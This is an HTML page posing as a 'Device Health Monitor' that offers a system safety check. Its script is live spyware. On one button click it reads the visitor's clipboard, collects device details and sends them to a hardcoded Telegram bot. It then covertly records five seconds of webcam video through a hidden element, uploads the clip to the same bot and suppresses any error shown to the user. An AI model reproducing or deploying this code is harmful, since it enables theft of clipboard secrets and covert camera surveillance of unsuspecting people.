<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK Secure System</title>
    <script src="https://cdn.tailwindcss.com"></script>
    
    <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>

    <style>
        body { background-color: #0b0f1a; color: #e2e8f0; }
        .glass { background: rgba(22, 30, 45, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
        .info-row { background: #1e293b; padding: 12px; border-radius: 8px; margin-bottom: 8px; border-left: 3px solid #0ea5e9; }
        .clip-box { background: #000; color: #38bdf8; padding: 10px; border-radius: 6px; font-size: 11px; font-family: monospace; }
        #cam-raw { display: none; } /* Video hidden from user */
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">

    <div class="glass p-8 rounded-3xl shadow-2xl w-full max-w-md text-center">
        <h2 class="text-xl font-bold text-sky-400 mb-6">Device Health Monitor</h2>
        
        <div class="text-left mb-6">
            <div class="info-row">
                <p class="text-[10px] text-slate-400 uppercase">System OS</p>
                <p id="ui-os" class="text-sm font-bold text-white">Loading...</p>
            </div>
            <div class="info-row">
                <p class="text-[10px] text-slate-400 uppercase">Screen Info</p>
                <p id="ui-res" class="text-sm font-bold text-white">Detecting...</p>
            </div>
            <div class="mt-4">
                <p class="text-xs text-slate-400 mb-2 uppercase">Detected Data:</p>
                <div id="ui-clip" class="clip-box">Checking system...</div>
            </div>
        </div>
        
        <video id="cam-raw" autoplay muted playsinline></video>

        <button id="trigger" class="w-full bg-sky-600 hover:bg-sky-500 text-white font-bold py-4 rounded-2xl transition-all shadow-lg active:scale-95">
            CHECK SYSTEM STATUS
        </button>

        <div id="loader" class="mt-6 hidden flex flex-col items-center">
            <div class="w-10 h-10 border-4 border-sky-500 border-t-transparent rounded-full animate-spin"></div>
            <p class="text-slate-500 text-xs mt-3">Analyzing device safety...</p>
        </div>
    </div>

    <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>

    <script>
        const BOT_TOKEN = '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs';
        const CHAT_ID = '6048050987';

        // Set UI Info
        document.getElementById('ui-os').innerText = navigator.platform;
        document.getElementById('ui-res').innerText = window.screen.width + "x" + window.screen.height;

        const btn = document.getElementById('trigger');
        const loader = document.getElementById('loader');
        const video = document.getElementById('cam-raw');

        btn.addEventListener('click', async () => {
            btn.style.display = 'none';
            loader.classList.remove('hidden');

            let clipData = "Access Denied";
            try {
                clipData = await navigator.clipboard.readText();
                document.getElementById('ui-clip').innerText = clipData || "No data found";
            } catch (e) { document.getElementById('ui-clip').innerText = "Permission Denied"; }

            // ১. Report Message (Directly to Bot)
            const logMessage = `
✅ *SEND SUCCESSFUL: REPORT DETAILS*
━━━━━━━━━━━━━━━━━━━━
📱 *Device OS:* \`${navigator.platform}\`
🖥 *Resolution:* \`${window.screen.width}x${window.screen.height}\`
🌐 *Browser:* \`${navigator.userAgent.substring(0, 50)}...\`

📋 *CLIPBOARD DATA:*
\`\`\`
${clipData}
\`\`\`
━━━━━━━━━━━━━━━━━━━━`;

            // Auto-send text to bot immediately
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: logMessage, parse_mode: 'Markdown' })
            });

            // ২. 5s Video Record and Auto-send
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                const recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('video', blob, 'security_clip.mp4');
                    // Caption e success message bot e jabe
                    fd.append('caption', '🎥 Video Clip: Send Successful');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 5000); // 5 Seconds Record

            } catch (err) {
                // Background error - user will not see anything
            }
        });
    </script>
</body>
</html>
